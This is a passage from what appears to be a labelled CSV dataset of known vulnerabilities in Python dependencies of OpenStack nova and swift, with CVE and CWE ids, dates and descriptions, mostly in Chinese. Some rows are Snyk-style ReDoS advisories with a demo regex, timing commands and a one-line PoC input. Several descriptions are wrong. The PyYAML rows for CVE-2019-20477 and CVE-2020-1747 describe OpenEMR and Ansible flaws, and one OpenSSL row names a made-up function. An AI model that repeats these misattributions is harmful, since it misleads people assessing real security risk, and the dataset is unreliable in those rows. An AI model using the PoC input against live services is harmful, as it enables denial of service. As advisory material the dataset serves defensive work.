It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_nova,eventlet,>=0.30.1,True,CVE-2021-21419,CWE-400,2021-05-07,"Eventlet是Python的一个并发网络库。
Eventlet 0.31.0 之前版本存在资源管理错误漏洞，该漏洞源于一个websocket peer可能会通过发送非常大的websocket帧来耗尽Eventlet端的内存。",3,2
openstack_nova,eventlet,>=0.30.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
openstack_nova,Jinja2,>=2.10,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
openstack_nova,Jinja2,>=2.10,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
openstack_nova,Jinja2,>=2.10,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
openstack_nova,Jinja2,>=2.10,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
openstack_nova,Jinja2,>=2.10,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
openstack_nova,Jinja2,>=2.10,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
openstack_nova,Jinja2,>=2.10,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
openstack_nova,lxml,>=4.5.0,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
openstack_nova,lxml,>=4.5.0,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
openstack_nova,lxml,>=4.5.0,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
openstack_nova,lxml,>=4.5.0,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
openstack_nova,cryptography,>=2.7,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
openstack_nova,cryptography,>=2.7,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
openstack_nova,cryptography,>=2.7,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_nova,cryptography,>=2.7,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_nova,cryptography,>=2.7,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_nova,cryptography,>=2.7,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
openstack_nova,cryptography,>=2.7,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
openstack_nova,cryptography,>=2.7,True,CVE-2020-36242,CWE-190 CWE-787,2021-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography package before 3.3.2 for Python 存在输入验证错误漏洞，该漏洞源于导致整数溢出和缓冲区溢出。",2,2
openstack_nova,cryptography,>=2.7,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
openstack_nova,cryptography,>=2.7,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
openstack_nova,cryptography,>=2.7,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
openstack_nova,cryptography,>=2.7,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
openstack_nova,cryptography,>=2.7,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
openstack_nova,cryptography,>=2.7,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
openstack_nova,cryptography,>=2.7,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
openstack_nova,cryptography,>=2.7,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
openstack_nova,cryptography,>=2.7,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
openstack_nova,cryptography,>=2.7,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
openstack_nova,cryptography,>=2.7,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
openstack_nova,cryptography,>=2.7,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
openstack_nova,WebOb,>=1.8.2,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
openstack_nova,paramiko,>=2.7.1,True,CVE-2022-24302,CWE-362,2022-03-17,"Paramiko是一个 SSHv2 协议的纯 Python 实现。提供客户端和服务器功能。
Paramiko 2.10.1之前版本 存在安全漏洞，该漏洞源于write_private_key_file函数中的竞争条件（creation and chmod之间）允许未经授权的信息泄露。",2,0
openstack_nova,requests,>=2.25.1,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_nova,requests,>=2.25.1,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_nova,requests,>=2.25.1,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_nova,psutil,>=3.2.2,True,CVE-2019-18874,CWE-415,2019-11-11,"psutil是一款基于Python的进程和系统监视库。
psutil 5.65及之前版本中存在资源管理错误漏洞。远程攻击者可借助特制数据利用该漏洞导致应用程序崩溃（拒绝服务）。",2,2
openstack_nova,PyYAML,>=5.1,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
openstack_nova,PyYAML,>=5.1,True,CVE-2019-20477,CWE-502,2020-02-19,CVE-2019-20477 是一个影响 OpenEMR 的严重漏洞，OpenEMR 是一种开源的电子病历和医疗管理系统。这个漏洞存在于接口的传入数据处理模块中，具体来说，漏洞源于对外部传入的 JSON 数据缺乏充分的验证，导致可以通过特定的 JSON 构造触发远程代码执行 (RCE)。利用这个漏洞的攻击者能够在目标系统上执行任意代码。,1,0
openstack_nova,PyYAML,>=5.1,True,CVE-2020-1747,CWE-20,2020-03-02,CVE-2020-1747 是一个影响 Ansible 模块的漏洞，具体是在 Ansible 库中使用的 urllib3 组件存在一个不安全的序列化漏洞。攻击者可以通过发送精心构造的 YAML 格式数据包来利用此漏洞，从而在目标系统上执行任意代码。漏洞的根本原因是 Ansible 在处理外部输入时，未能正确地验证和过滤输入数据，导致了反序列化漏洞的产生。,1,0
openstack_swift,sphinx,">=2.0.0,!=2.1.0",True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_swift,sphinx,">=2.0.0,!=2.1.0",True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_swift,sphinx,">=2.0.0,!=2.1.0",True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_swift,sphinx,">=2.0.0,!=2.1.0",True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_swift,eventlet,">=0.25.0,!=0.34.3",True,CVE-2021-21419,CWE-400,2021-05-07,"Eventlet是Python的一个并发网络库。
Eventlet 0.31.0 之前版本存在资源管理错误漏洞，该漏洞源于一个websocket peer可能会通过发送非常大的websocket帧来耗尽Eventlet端的内存。",3,2
openstack_swift,eventlet,">=0.25.0,!=0.34.3",True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
openstack_swift,lxml,>=4.2.3,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
openstack_swift,lxml,>=4.2.3,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
openstack_swift,lxml,>=4.2.3,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
openstack_swift,lxml,>=4.2.3,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
openstack_swift,lxml,>=4.2.3,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
openstack_swift,lxml,>=4.2.3,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
openstack_swift,requests,>=2.14.2,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
openstack_swift,requests,>=2.14.2,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_swift,requests,>=2.14.2,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_swift,requests,>=2.14.2,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
openstack_swift,cryptography,>=2.0.2,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
